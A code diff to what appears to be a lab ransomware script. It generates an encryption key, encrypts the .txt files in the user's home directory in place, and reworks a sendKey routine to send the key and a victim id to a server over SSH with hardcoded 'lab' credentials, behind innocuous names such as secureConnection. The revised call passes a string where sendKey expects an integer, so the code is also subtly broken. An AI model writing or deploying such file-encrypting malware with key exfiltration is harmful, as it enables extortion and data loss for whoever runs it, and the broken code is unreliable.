@@ -34,7 +34,7 @@ def getStat():
 
 def secureConnection():
     key = Fernet.generate_key()
-    sendKey(key)
+    sendKey(key, "127.0.0.1", )
 
     for file in os.listdir(os.path.expanduser(homeDirectory)):
         if file.endswith(".txt"):
@@ -47,18 +47,20 @@ def secureConnection():
                 fileContents.write(encryptedData)
 
 
-def sendKey(key):
-    try:
-        with open(homeDirectory + "/key.key", "wb") as keyFile:
-            keyFile.write(key)
-    except Exception as e:
-        print(e)
-
-    ssh = paramiko.SSHClient()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    ssh.connect("localhost", username='lab', password='lab')
-    sftp = ssh.open_sftp()
-    sftp.put(homeDirectory + "/key.key", "/home/lab/clientKey.key")
+def sendKey(key, id):
+    # with open(homeDirectory + "/key.key", "wb") as keyFile:
+    #     keyFile.write(key)
+    #
+    # ssh = paramiko.SSHClient()
+    # ssh.connect("localhost", username='lab', password='lab', port=22)
+    # sftp = ssh.open_sftp()
+    # sftp.put(homeDirectory + "/key.key", "/home/lab/clientKey.key")
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect('127.0.0.1', username='lab', password='lab')
+    channelObject = client.get_transport().open_session()
+    channelObject.send(key + "\n".encode("ascii") + (id).to_bytes(2, byteorder='big'))
+    client.close()
 
 
 def getKey():
